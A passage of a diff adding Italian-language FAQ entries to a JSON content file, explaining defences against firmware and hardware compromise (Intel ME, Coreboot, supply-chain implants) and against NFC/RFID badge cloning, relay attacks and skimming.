+        "La minaccia più profonda e più difficile: la compromissione a livello **hardware o firmware**, sotto ogni difesa software. Le forme:\n\n- **firmware malevolo o vulnerabile**: BIOS/UEFI, controller di dischi e periferiche, il famigerato **Intel Management Engine (ME)** – un sottosistema con accesso privilegiato che gira *indipendentemente* dalla CPU e dall'OS, non ispezionabile e potenzialmente un rischio. Strumenti come **me_cleaner** ne neutralizzano gran parte (con cautela – può rendere la macchina inavviabile), e **Coreboot** sostituisce il firmware proprietario con uno aperto e auditabile su hardware supportato\n- **impianti hardware**: componenti aggiunti alla catena di fornitura per intercettare o esfiltrare (il tema, molto dibattuto, degli impianti su server) – improbabili per la maggioranza, reali per bersagli di alto valore\n\nLe difese, in scala di realismo: per la stragrande maggioranza, l'attenzione va alla **provenienza** (comprare da canali fidati, [verificare le firme di ISO e binari](q/come-si-firma-il-codice/)), agli **aggiornamenti firmware** (le CVE del firmware sono reali e trascurate), e alla [root of trust](q/secure-boot-personalizzato-chiavi-proprie/) con Secure Boot e TPM. Per i modelli di minaccia estremi (giornalisti, stato, alto valore): [firmware aperto](q/secure-element-vs-firmware-aperto/), hardware con [kill-switch](q/kill-switch-hardware-privacy/), e ispezione fisica. È il confine dove la sicurezza incontra la [supply chain hardware](q/cos-e-la-supply-chain-security/) e la fiducia nel produttore diventa inevitabile – la domanda diventa *di chi ti fidi*, e quanto puoi verificarlo."
+      ]
+    },
+    {
+      "id": "nfc-rfid-security",
+      "slug": "clonazione-nfc-rfid-e-difese",
+      "question": "Come ci si difende dalla clonazione di credenziali NFC/RFID?",
+      "vertical": "security",
+      "keywords": [
+        "nfc",
+        "rfid",
+        "clonazione badge",
+        "clonare tessera",
+        "mifare",
+        "relay attack",
+        "badge accesso",
+        "carte contactless",
+        "skimming",
+        "desfire"
+      ],
+      "answers": [
+        "Le credenziali **contactless** (badge di accesso, carte) sono comode e, nelle versioni vecchie, spaventosamente insicure. I rischi:\n\n- **clonazione**: le tecnologie legacy come **MIFARE Classic** sono crittograficamente rotte da anni – un badge si copia in secondi con hardware economico (un Proxmark, o perfino un telefono). Molti sistemi di accesso aziendali girano ancora su queste\n- **relay attack**: due dispositivi che fanno da ponte estendono il raggio di una carta – la carta è in tasca, ma un attaccante ne \"allunga\" il segnale per usarla a distanza (rilevante anche per le chiavi auto keyless)\n- **skimming**: lettura non autorizzata a distanza ravvicinata\n\nLe difese: **migrare a tecnologie moderne** – MIFARE **DESFire EV2/EV3** o **SEOS**, con crittografia forte e mutua autenticazione (la clonazione banale non funziona più); per le carte di pagamento e i passaporti, le **guaine schermanti** (Faraday) contro lo skimming; contro il relay sulle auto, custodie schermate per le chiavi. E il principio di sempre: il contactless è **un fattore**, e per gli accessi che contano va combinato con altro ([MFA](q/cos-e-autenticazione-due-fattori-mfa/), PIN) in [difesa in profondità](q/cos-e-la-defense-in-depth/) – un badge, come una password, non dovrebbe mai essere l'unica cosa tra un estraneo e il tuo sistema. Sul fronte digitale, l'equivalente robusto sono le [chiavi di sicurezza FIDO2](q/chiavi-di-sicurezza-hardware-yubikey/), che il relay e la clonazione non toccano."
+      ]
+    },
+    {
       "id": "vm-non-parte",
       "slug": "vm-non-parte-proxmox",
       "question": "La VM non parte: i controlli in ordine",
